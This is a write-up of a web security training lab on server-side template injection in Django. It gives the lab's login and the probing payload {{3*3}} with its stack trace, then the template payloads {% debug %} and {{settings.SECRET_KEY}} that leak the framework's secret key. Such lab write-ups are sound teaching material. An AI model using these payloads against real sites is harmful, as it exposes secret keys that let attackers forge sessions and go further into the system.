# Server-Side Template Injection — Information Disclosure via User-Supplied Objects

This lab is exploitable through server-side template injection, caused by how an object gets passed into the template. The flaw can be leveraged to access sensitive data.

**Goal:** Steal and submit the framework's secret key.

Login credentials for your own account: content-manager:C0nt3ntM4n4g3r

---

**Reference:**
- https://portswigger.net/web-security/server-side-template-injection/exploiting

pic 1

---

The post templates can be edited directly:

pic 2

Values calculated in the format `${product.X}` show up on the page:

pic 3

Submitting the payload `{{3*3}}` produces the following stack trace:

pic 4

```
Traceback (most recent call last):  File "<string>", line 11, in <module>  File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__    self.nodelist = self.compile_nodelist()  File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist    return parser.parse()  File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse    raise self.error(token, e)django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '*3' from '3*3'
```

This confirms a Django template engine is in use, so debug info can be leaked with:

```
{% debug %}
```

pic 5

Django exposes a `settings` object of type `UserSettingsHolder`:

```
{{settings}}
```

pic 6

That object includes a `SECRET_KEY` field:

```
{{settings.SECRET_KEY}}
```

pic 7
